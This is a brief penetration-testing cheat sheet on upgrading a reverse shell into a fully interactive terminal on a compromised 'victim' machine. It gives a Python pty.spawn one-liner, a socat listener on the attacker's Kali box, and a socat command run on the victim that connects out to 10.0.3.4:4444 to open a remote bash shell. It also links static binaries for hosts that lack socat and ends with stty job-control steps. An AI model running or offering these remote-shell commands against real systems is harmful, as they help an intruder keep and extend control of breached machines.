---
description: >-
  Have a reverse shell without job control? Check these out. If possible, Socat
  will yield the best results for job control and tab completion
---

# Upgrading Shells

### Importing shell w/ Python

```python
# In reverse shell
$ python -c 'import pty; pty.spawn("/bin/bash")'
```

### Socat

{% hint style="info" %}
Victim doesn't have socat? No problem!&#x20;

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)
{% endhint %}

```bash
# On Kali
socat file:`tty`,raw,echo=0 tcp-listen:4444
# On Victim
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
```

### Using Super Magical Powers

```bash
# On your client
# Ctrl-Z to Background your session

$ stty raw -echo
$ fg

# It should now look super weird, DO NOT PRESS ANY KEYS BEFORE THE NEXT STEP

$ reset
$ export SHELL=bash
$ export TERM=xterm-256color
$ stty rows <num> columns <cols>
```



